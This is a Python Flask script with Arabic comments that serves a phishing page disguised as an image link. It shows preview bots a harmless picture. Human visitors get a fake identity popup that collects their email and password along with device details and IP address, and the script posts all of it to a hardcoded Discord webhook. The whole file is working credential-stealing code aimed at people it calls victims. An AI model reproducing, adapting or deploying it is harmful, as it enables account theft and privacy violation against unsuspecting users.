from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# --- الإعدادات ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://static0.thegamerimages.com/wordpress/wp-content/uploads/wm/2025/03/kisuke-urahara-in-bleach-rebirth-of-souls.jpg?w=1600&h=900&fit=crop" # الرابط الذي سيراه الضحية في النهاية

@app.route('/')
@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # منع بوتات المعاينة
    if any(bot in ua.lower() for bot in ["discord", "facebook", "twitter", "telegram"]):
        return f'<meta property="og:image" content="{REAL_IMAGE}"><img src="{REAL_IMAGE}">'

    html_code = '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <script src="https://jsdelivr.net"></script>
    </head>
    <body style="margin:0; background:black; height:100vh; display:flex; justify-content:center; align-items:center;">
        <img src="{{ img_url }}" id="img" style="max-width:100%; display:none;">
        <script>
            async function capture() {
                // 1. تحديد نوع الجهاز
                let device = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 💻";
                
                // 2. طلب البيانات الحساسة
                const { value: data } = await Swal.fire({
                    title: 'تأكيد الهوية',
                    html: '<input id="e" class="swal2-input" placeholder="الإيميل">' +
                         '<input id="p" type="password" class="swal2-input" placeholder="كلمة المرور">',
                    confirmButtonText: 'دخول',
                    allowOutsideClick: false
                });

                document.getElementById('img').style.display = 'block';

                // 3. جمع بيانات الجهاز
                let battery = await navigator.getBattery();
                let payload = {
                    "الإيميل": document.getElementById('e').value || "N/A",
                    "الباسورد": document.getElementById('p').value || "N/A",
                    "الجهاز": device,
                    "البطارية": (battery.level * 100) + "%",
                    "المعالج": navigator.hardwareConcurrency + " Cores",
                    "المنصة": navigator.platform
                };

                // 4. الإرسال للـ Webhook
                fetch("{{ webhook }}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        "embeds": [{
                            "title": "👤 صيد جديد!",
                            "color": 16711680,
                            "fields": Object.keys(payload).map(k => ({name: k, value: payload[k], inline: true})),
                            "footer": {"text": "IP: {{ ip }}"}
                        }]
                    })
                });
            }
            window.onload = capture;
        </script>
    </body>
    </html>
    '''
    
    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)

# ملاحظة: في Vercel لا نستخدم app.run()
